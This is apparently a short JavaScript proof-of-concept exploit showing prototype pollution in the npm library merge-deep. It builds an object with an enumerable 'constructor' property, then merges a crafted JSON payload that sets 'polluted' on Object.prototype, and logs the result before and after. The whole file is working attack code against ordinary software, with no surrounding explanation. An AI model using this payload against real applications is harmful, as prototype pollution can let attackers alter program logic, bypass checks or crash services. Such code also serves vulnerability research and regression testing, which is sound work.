var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const merge = require('merge-deep');
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
merge(obj, JSON.parse(malicious_payload));
console.log({}.polluted);